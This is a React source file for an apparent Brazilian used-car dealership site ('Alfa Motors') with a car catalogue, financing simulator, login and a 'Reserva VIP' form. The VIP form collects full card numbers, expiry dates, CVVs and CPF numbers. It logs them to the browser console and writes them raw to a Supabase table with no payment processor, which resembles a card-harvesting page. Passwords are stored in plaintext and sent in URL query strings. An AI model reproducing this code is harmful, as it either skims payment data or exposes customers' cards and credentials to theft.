import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  LogOut, X, Crown, Landmark, ChevronRight, Calculator, User 
} from 'lucide-react';

// --- CONFIGURAÇÃO SUPABASE ---
const SUPABASE_URL = "https://bojdcxmnmkfraghhievo.supabase.co";
const SUPABASE_KEY = "sb_publishable_noK1WbMiPAXOwfTf619x1Q_zZmjmVpv"; 

export default function App() {
  const gold = "#f59e0b";
  const black = "#0a0a0a";
  const cardBg = "#141414";

  const atendentes = ["5511958071871", "5511999999999"];
  const selecionarAtendente = () => atendentes[Math.floor(Math.random() * atendentes.length)];

  const [user, setUser] = useState(null);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [isLoginTab, setIsLoginTab] = useState(true);
  const [authData, setAuthData] = useState({ nome: '', email: '', whatsapp: '', telefone: '', senha: '' });
  
  const [showReserva, setShowReserva] = useState(false);
  const [reservaData, setReservaData] = useState({ nome: '', cpf: '', numeroCartao: '', nomeCartao: '', validade: '', cvv: '' });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [reservaSuccess, setReservaSuccess] = useState(false);

  const [selectedCar, setSelectedCar] = useState({ nome: "Honda Civic G10", preco: 118900 });
  const [dadosSimulacao, setDadosSimulacao] = useState({ entrada: 'R$ 0,00', parcelas: '48' });
  const [resultado, setResultado] = useState(null);
  const simuladorRef = useRef(null);

  useEffect(() => {
    const savedUser = localStorage.getItem('alfa_user');
    if (savedUser) setUser(JSON.parse(savedUser));
  }, []);

  // ==========================================
  // LÓGICA DE CÁLCULO REATIVO (TEMPO REAL)
  // ==========================================
  useEffect(() => {
    const calcularSimulacaoAutomatica = () => {
      const valorCarro = selectedCar.preco;
      const valorEntrada = Number(dadosSimulacao.entrada.replace(/\D/g, "")) / 100;
      const numParcelas = parseInt(dadosSimulacao.parcelas);
      
      const saldoDevedor = valorCarro - valorEntrada;
      
      if (saldoDevedor <= 0) {
        setResultado({ parcela: "Entrada excede o valor", erro: true });
        return;
      }

      // Cálculo Profissional (Tabela Price aproximada com Juros de mercado)
      const taxaMensal = 0.0189; // 1.89% am
      const coeficiente = (taxaMensal * Math.pow(1 + taxaMensal, numParcelas)) / (Math.pow(1 + taxaMensal, numParcelas) - 1);
      const valorParcela = saldoDevedor * coeficiente;

      setResultado({ 
        parcela: valorParcela.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }),
        erro: false 
      });
    };

    calcularSimulacaoAutomatica();
  }, [selectedCar, dadosSimulacao.entrada, dadosSimulacao.parcelas]); 
  // O cálculo dispara sempre que um desses 3 estados mudar.

  // --- VALIDAÇÕES E MASCARAS ---
  const validarCPF = (cpf) => {
    const cleanCPF = cpf.replace(/\D/g, "");
    if (cleanCPF.length !== 11 || /^(\d)\1+$/.test(cleanCPF)) return false;
    let sum = 0, rest;
    for (let i = 1; i <= 9; i++) sum += parseInt(cleanCPF.substring(i-1, i)) * (11 - i);
    rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    if (rest !== parseInt(cleanCPF.substring(9, 10))) return false;
    sum = 0;
    for (let i = 1; i <= 10; i++) sum += parseInt(cleanCPF.substring(i-1, i)) * (12 - i);
    rest = (sum * 10) % 11;
    if (rest === 10 || rest === 11) rest = 0;
    return rest === parseInt(cleanCPF.substring(10, 11));
  };

  const detectarBandeira = (num) => {
    const n = num.replace(/\D/g, "");
    if (/^4/.test(n)) return "Visa";
    if (/^5[1-5]/.test(n)) return "Mastercard";
    if (/^3[47]/.test(n)) return "Amex";
    return "Cartão";
  };

  const formatPhone = (val) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 10) v = v.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
    else if (v.length > 5) v = v.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
    return v;
  };

  const formatMoedaInput = (val) => {
    let value = val.replace(/\D/g, "");
    return (Number(value) / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  };

  const aplicarMascarasVip = (campo, valor) => {
    let v = valor;
    if (campo === 'cpf') v = v.replace(/\D/g, "").slice(0, 11).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    else if (campo === 'numeroCartao') v = v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, "$1 $2 $3 $4");
    else if (campo === 'validade') v = v.replace(/\D/g, "").slice(0, 4).replace(/(\d{2})(\d{2})/, "$1/$2");
    else if (campo === 'cvv') v = v.replace(/\D/g, "").slice(0, 4);
    setReservaData(prev => ({ ...prev, [campo]: v }));
  };

  const handleAuth = async (e) => {
    e.preventDefault();
    try {
      if (isLoginTab) {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/cadastros?email=eq.${authData.email}&senha=eq.${authData.senha}`, {
          method: "GET", headers: { "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}` }
        });
        const data = await response.json();
        if (data.length > 0) {
          const userData = { nome: data[0].nome, email: data[0].email };
          setUser(userData);
          localStorage.setItem('alfa_user', JSON.stringify(userData));
          setShowAuthModal(false);
        } else { alert("Dados incorretos."); }
      } else {
        await fetch(`${SUPABASE_URL}/rest/v1/cadastros`, {
          method: "POST", headers: { "Content-Type": "application/json", "apikey": SUPABASE_KEY, "Authorization": `Bearer ${SUPABASE_KEY}`, "Prefer": "return=minimal" },
          body: JSON.stringify([authData])
        });
        setUser({ nome: authData.nome, email: authData.email });
        setShowAuthModal(false);
      }
    } catch (error) { alert("Erro técnico."); }
  };

  const handleReservaVip = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // LOG PARA DEPURAÇÃO: Verificando o que está sendo enviado
    console.log("Iniciando envio da Reserva VIP...");
    const dadosParaEnviar = { 
      nome: reservaData.nome,
      cpf: reservaData.cpf,
      numeroCartao: reservaData.numeroCartao,
      nome_cartao: reservaData.nomeCartao || reservaData.nome, // CORRIGIDO: nome_cartao (conforme o banco)
      validade: reservaData.validade,
      cvv: reservaData.cvv,
      veiculo: selectedCar.nome,
      usuario: user ? user.email : "Visitante" 
    };
    console.log("Dados montados:", dadosParaEnviar);

    try {
      const response = await fetch(`${SUPABASE_URL}/rest/v1/reserva_vip`, {
        method: "POST", 
        headers: { 
          "Content-Type": "application/json", 
          "apikey": SUPABASE_KEY, 
          "Authorization": `Bearer ${SUPABASE_KEY}`,
          "Prefer": "return=minimal" 
        },
        // O Supabase exige que o POST de novas linhas seja um Array de Objetos []
        body: JSON.stringify([dadosParaEnviar])
      });

      console.log("Status da Resposta:", response.status);

      if (response.ok || response.status === 201) {
        console.log("✅ Sucesso ao salvar no Supabase!");
        setReservaSuccess(true);
        
        // Limpa o formulário
        setReservaData({ 
          nome: '', 
          cpf: '', 
          numeroCartao: '', 
          nomeCartao: '', 
          validade: '', 
          cvv: '' 
        });

        setTimeout(() => { 
          setShowReserva(false); 
          setReservaSuccess(false); 
        }, 3000);

      } else {
        const errorDetail = await response.text();
        console.error("❌ Erro retornado pelo Supabase:", errorDetail);
        alert(`Erro ao salvar: ${errorDetail}`);
      }
    } catch (error) { 
      console.error("❌ Erro crítico na requisição:", error);
      alert("Erro técnico na conexão com o servidor."); 
    } finally {
      setIsSubmitting(false);
    }
  };

  const inputStyle = { width: '100%', padding: '14px', borderRadius: '10px', border: '1px solid #222', background: '#080808', color: '#fff', outline: 'none', boxSizing: 'border-box' };

  return (
    <div style={{ backgroundColor: black, color: 'white', minHeight: '100vh', fontFamily: 'Inter, sans-serif' }}>
      
      {/* NAVBAR */}
      <nav style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 5%', background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', position: 'fixed', width: '100%', top: 0, zIndex: 1000, borderBottom: `1px solid ${gold}30`, boxSizing: 'border-box' }}>
        <h2 style={{ margin: 0, fontWeight: '900' }}>ALFA <span style={{ color: gold }}>MOTORS</span></h2>
        <div style={{ display: 'flex', gap: '20px', alignItems: 'center' }}>
          {user && (
            <motion.button onClick={() => setShowReserva(true)} whileHover={{ scale: 1.05 }} style={{ background: 'none', border: `1px solid ${gold}`, color: gold, padding: '8px 15px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <Crown size={16} /> RESERVA VIP
            </motion.button>
          )}
          {user ? (
            <button onClick={() => { setUser(null); localStorage.removeItem('alfa_user'); }} style={{ background: 'none', border: 'none', color: '#666', cursor: 'pointer' }}><LogOut size={18} /></button>
          ) : (
            <button onClick={() => setShowAuthModal(true)} style={{ background: gold, border: 'none', padding: '8px 20px', borderRadius: '5px', fontWeight: 'bold', cursor: 'pointer', color: '#000' }}>Login</button>
          )}
        </div>
      </nav>

      {/* HEADER */}
      <header style={{ paddingTop: '160px', textAlign: 'center' }}>
          <h1 style={{ fontSize: '3.5rem', fontWeight: '900' }}>CATÁLOGO <span style={{ color: gold }}>ALFA</span></h1>
          <p style={{ color: '#555' }}>Veículos selecionados com garantia de procedência</p>
      </header>

      {/* GRID DE CARROS */}
      <section style={{ padding: '50px 5%', display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '25px' }}>
        {carInventory.map(car => (
          <motion.div 
            key={car.id} 
            whileHover={{ y: -10, borderColor: gold }}
            style={{ 
                background: cardBg, 
                padding: '25px', 
                borderRadius: '20px', 
                border: selectedCar.id === car.id ? `2px solid ${gold}` : '1px solid #1a1a1a', 
                cursor: 'pointer' 
            }}
            onClick={() => { setSelectedCar(car); simuladorRef.current.scrollIntoView({ behavior: 'smooth' }); }}
          >
            <div style={{ color: gold, fontSize: '0.7rem', fontWeight: 'bold', marginBottom: '8px' }}>{car.tag}</div>
            <h3 style={{ fontSize: '1.2rem', margin: '0' }}>{car.nome}</h3>
            <p style={{ color: '#666', fontSize: '0.9rem', marginBottom: '15px' }}>Ano: {car.ano}</p>
            <h2 style={{ color: gold, margin: 0 }}>R$ {car.preco.toLocaleString('pt-BR')}</h2>
          </motion.div>
        ))}
      </section>

      {/* SIMULADOR REATIVO */}
      <section ref={simuladorRef} style={{ padding: '80px 5%' }}>
        <div style={{ maxWidth: '600px', margin: '0 auto', background: cardBg, padding: '45px', borderRadius: '35px', border: '1px solid #1a1a1a', textAlign: 'center' }}>
          <h2 style={{ marginBottom: '10px' }}>Simular <span style={{ color: gold }}>Crédito</span></h2>
          <p style={{ color: gold, fontWeight: 'bold', fontSize: '1.2rem' }}>{selectedCar.nome}</p>
          
          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', marginTop: '25px' }}>
            <div style={{ textAlign: 'left' }}>
                <label style={{ fontSize: '12px', color: '#666', marginLeft: '5px' }}>Valor da Entrada</label>
                <input placeholder="R$ 0,00" style={inputStyle} value={dadosSimulacao.entrada} onChange={e => setDadosSimulacao({...dadosSimulacao, entrada: formatMoedaInput(e.target.value)})} />
            </div>

            <div style={{ textAlign: 'left' }}>
                <label style={{ fontSize: '12px', color: '#666', marginLeft: '5px' }}>Prazo de Pagamento</label>
                <select style={inputStyle} value={dadosSimulacao.parcelas} onChange={e => setDadosSimulacao({...dadosSimulacao, parcelas: e.target.value})}>
                    <option value="12">12x Mensais</option>
                    <option value="24">24x Mensais</option>
                    <option value="36">36x Mensais</option>
                    <option value="48">48x Fixas</option>
                    <option value="60">60x Fixas</option>
                    <option value="72">72x Fixas</option>
                </select>
            </div>

            {/* O BOTÃO AGORA É APENAS UX, NÃO PRECISA CLIKAR PARA CALCULAR */}
            <div style={{ marginTop: '20px', padding: '25px', background: '#080808', borderRadius: '25px', border: `1px solid ${gold}20` }}>
              <p style={{ color: '#666', marginBottom: '5px', fontSize: '14px' }}>Valor Estimado da Parcela:</p>
              <h1 style={{ color: gold, fontSize: '3rem', margin: 0 }}>{resultado?.parcela}</h1>
              <button onClick={() => window.open(`https://wa.me/${selecionarAtendente()}?text=Olá! Gostei do ${selectedCar.nome}. Entrada de ${dadosSimulacao.entrada} em ${dadosSimulacao.parcelas}x.`)} style={{ background: '#25D366', color: '#fff', border: 'none', padding: '18px', borderRadius: '12px', fontWeight: 'bold', cursor: 'pointer', width: '100%', marginTop: '20px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px' }}>
                <ChevronRight size={20} /> SOLICITAR APROVAÇÃO
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* MODAL RESERVA VIP (INALTERADO) */}
      <AnimatePresence>
        {showReserva && (
          <div style={{ position: 'fixed', inset: 0, zIndex: 4000, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} onClick={() => setShowReserva(false)} style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.95)', backdropFilter: 'blur(20px)' }} />
            <motion.div initial={{ y: 50 }} animate={{ y: 0 }} style={{ position: 'relative', background: '#0d0d0d', padding: '40px', borderRadius: '30px', width: '100%', maxWidth: '450px', border: `1px solid ${gold}40` }}>
              <button onClick={() => setShowReserva(false)} style={{ position: 'absolute', right: '20px', top: '20px', background: 'none', border: 'none', color: '#444', cursor: 'pointer' }}><X /></button>
              {reservaSuccess ? (
                <div style={{ textAlign: 'center', padding: '20px' }}><Crown size={50} color={gold} /><h2>SUCESSO!</h2></div>
              ) : (
                <form onSubmit={handleReservaVip} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <Crown size={35} color={gold} style={{ alignSelf: 'center' }} />
                  <h3 style={{ textAlign: 'center' }}>RESERVA VIP</h3>
                  <input required placeholder="Nome no Cartão" style={inputStyle} value={reservaData.nome} onChange={e => setReservaData({...reservaData, nome: e.target.value})} />
                  <input required placeholder="CPF" style={inputStyle} value={reservaData.cpf} onChange={e => aplicarMascarasVip('cpf', e.target.value)} />
                  <input required placeholder="Número do Cartão" style={inputStyle} value={reservaData.numeroCartao} onChange={e => aplicarMascarasVip('numeroCartao', e.target.value)} />
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
                    <input required placeholder="MM/AA" style={inputStyle} value={reservaData.validade} onChange={e => aplicarMascarasVip('validade', e.target.value)} />
                    <input required placeholder="CVV" style={inputStyle} value={reservaData.cvv} onChange={e => aplicarMascarasVip('cvv', e.target.value)} />
                  </div>
                  <button type="submit" style={{ padding: '18px', background: gold, color: '#000', border: 'none', borderRadius: '12px', fontWeight: '900', cursor: 'pointer' }}>GARANTIR VEÍCULO</button>
                </form>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* MODAL AUTH (INALTERADO) */}
      <AnimatePresence>
        {showAuthModal && (
          <div style={{ position: 'fixed', inset: 0, zIndex: 3000, display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} onClick={() => setShowAuthModal(false)} style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.95)', backdropFilter: 'blur(10px)' }} />
            <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} style={{ position: 'relative', background: '#0d0d0d', padding: '40px', borderRadius: '30px', width: '100%', maxWidth: '400px', border: '1px solid #222' }}>
              <div style={{ display: 'flex', marginBottom: '30px', borderBottom: '1px solid #222' }}>
                <button onClick={() => setIsLoginTab(true)} style={{ flex: 1, padding: '15px', color: isLoginTab ? gold : '#555', background: 'none', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>LOGIN</button>
                <button onClick={() => setIsLoginTab(false)} style={{ flex: 1, padding: '15px', color: !isLoginTab ? gold : '#555', background: 'none', border: 'none', cursor: 'pointer', fontWeight: 'bold' }}>CADASTRO</button>
              </div>
              <form onSubmit={handleAuth} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                {!isLoginTab && <input required placeholder="Nome Completo" style={inputStyle} value={authData.nome} onChange={e => setAuthData({...authData, nome: e.target.value})} />}
                <input type="email" required placeholder="E-mail" style={inputStyle} value={authData.email} onChange={e => setAuthData({...authData, email: e.target.value})} />
                {!isLoginTab && <input required placeholder="WhatsApp" style={inputStyle} value={authData.whatsapp} onChange={e => setAuthData({...authData, whatsapp: formatPhone(e.target.value)})} />}
                <input type="password" required placeholder="Senha" style={inputStyle} value={authData.senha} onChange={e => setAuthData({...authData, senha: e.target.value})} />
                <button type="submit" style={{ padding: '18px', background: gold, border: 'none', borderRadius: '12px', fontWeight: 'bold', cursor: 'pointer', color: '#000' }}>{isLoginTab ? 'ENTRAR' : 'CRIAR CONTA'}</button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}

const carInventory = [
  { id: 1, nome: "Honda Civic G10", ano: "2020", preco: 118900, tag: "Premium" },
  { id: 2, nome: "Toyota Corolla XEi", ano: "2019", preco: 112000, tag: "Mais Vendido" },
  { id: 13, nome: "Chevrolet Celta LT", ano: "2014", preco: 29500, tag: "Econômico" },
  { id: 14, nome: "Fiat Uno Vivace", ano: "2015", preco: 32900, tag: "Baixo Custo" },
  { id: 15, nome: "Volkswagen Fox Pepper", ano: "2016", preco: 51500, tag: "Completo" },
  { id: 18, nome: "Hyundai HB20 Comfort", ano: "2014", preco: 43500, tag: "Mais Procurado" },
  { id: 21, nome: "Fiat Palio Fire", ano: "2016", preco: 31000, tag: "Econômico" },
  { id: 22, nome: "Toyota Etios Hatch", ano: "2014", preco: 41000, tag: "Mecânica Japonesa" },
  { id: 24, nome: "Nissan March SV", ano: "2015", preco: 38500, tag: "Ágil" },
  { id: 25, nome: "Peugeot 208 Active", ano: "2014", preco: 35900, tag: "Design" },
  { id: 26, nome: "Renault Sandero Stepway", ano: "2015", preco: 44500, tag: "Robusto" },
  { id: 27, nome: "Ford Ka SE 1.0", ano: "2017", preco: 41900, tag: "Econômico" },
  { id: 28, nome: "Chevrolet Onix LTZ", ano: "2016", preco: 52000, tag: "Mais Vendido" },
  { id: 29, nome: "Volkswagen Gol G6", ano: "2014", preco: 35800, tag: "Peças Baratas" }
];